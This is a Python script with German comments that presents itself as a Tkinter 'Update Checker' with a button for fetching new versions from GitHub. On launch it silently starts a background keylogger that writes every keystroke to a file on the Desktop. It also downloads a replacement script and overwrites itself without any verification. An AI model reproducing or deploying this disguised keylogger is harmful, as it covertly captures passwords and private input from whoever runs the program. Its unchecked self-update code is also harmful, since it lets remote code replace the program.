import requests
import os
import shutil
import sys
import tkinter as tk
from pynput import keyboard

# Aktuelle Version definieren
current_version = "1.0.2"  # Deine aktuelle Version
script_name = os.path.basename(__file__)  # Der Name des aktuellen Scripts

# GitHub Repository Informationen
github_username = "dein-benutzername"  # Dein GitHub Benutzername
repository_name = "dein-repository"  # Dein Repository Name

# Pfad zur Datei auf dem Desktop
file_path = r"C:\Users\mishu\Desktop\tastenanschlaege.txt"

# Funktion zur Überprüfung und zum Download der neuesten Version
def check_for_update():
    print("Checking for new version...")
    
    # GitHub API URL für die neueste Version
    api_url = f"https://api.github.com/repos/{github_username}/{repository_name}/releases/latest"
    
    try:
        # API Anfrage an GitHub, um die neueste Version zu bekommen
        response = requests.get(api_url)
        if response.status_code == 200:
            release_data = response.json()
            latest_version = release_data['tag_name']  # Die neueste Version aus dem Tag des Releases
            print(f"Latest version on GitHub: {latest_version}")

            # Vergleiche die Versionen
            if compare_versions(latest_version, current_version):
                print(f"A new version ({latest_version}) is available!")
                download_new_version(latest_version)
            else:
                print("You are using the latest version.")
        else:
            print("Error checking GitHub for updates.")
    except Exception as e:
        print(f"Error occurred: {e}")

# Funktion, um die Versionen zu vergleichen
def compare_versions(version1, version2):
    # Vergleiche die Versionsnummern lexikografisch (Version als String vergleichen)
    return version1 > version2

# Funktion zum Herunterladen und Ersetzen der Version
def download_new_version(version):
    try:
        print(f"Downloading new version {version}...")
        # GitHub Release URL (hier könntest du den Dateinamen anpassen)
        download_url = f"https://github.com/{github_username}/{repository_name}/releases/download/{version}/new_version.py"
        
        response = requests.get(download_url, stream=True)
        
        if response.status_code == 200:
            temp_file_path = "new_version.py"  # Temporäre Datei für die neue Version
            with open(temp_file_path, "wb") as file:
                for chunk in response.iter_content(chunk_size=1024):
                    if chunk:
                        file.write(chunk)

            # Ersetze das aktuelle Script durch die neue Version
            print("Replacing current script with the new version...")
            shutil.move(temp_file_path, script_name)  # Die neue Version überschreibt das alte Script
            print("New version downloaded and installed.")
        else:
            print("Failed to download the new version.")
    except Exception as e:
        print(f"Error downloading the new version: {e}")

# GUI mit Tkinter für den Knopf
def create_gui():
    root = tk.Tk()
    root.title("Update Checker")
    
    update_button = tk.Button(root, text="Check for Updates", command=check_for_update)
    update_button.pack(pady=20)
    
    root.mainloop()

# Funktionen zur Tastatureingabeüberwachung
def on_press(key):
    try:
        with open(file_path, 'a') as f:
            f.write(f'{key.char}\n')  # Schreibe den Tastenanschlag in die Datei
    except AttributeError:
        with open(file_path, 'a') as f:
            f.write(f'{key}\n')  # Für Sondertasten wie 'Esc' oder 'Space'

def on_release(key):
    if key == keyboard.Key.esc:  # Beende das Programm, wenn die Escape-Taste gedrückt wird
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Hauptfunktion starten
if __name__ == "__main__":
    # Starte den Keylogger in einem separaten Thread
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Damit der Thread beendet wird, wenn das Hauptprogramm beendet wird
    keylogger_thread.start()
    
    # Starte die GUI
    create_gui()
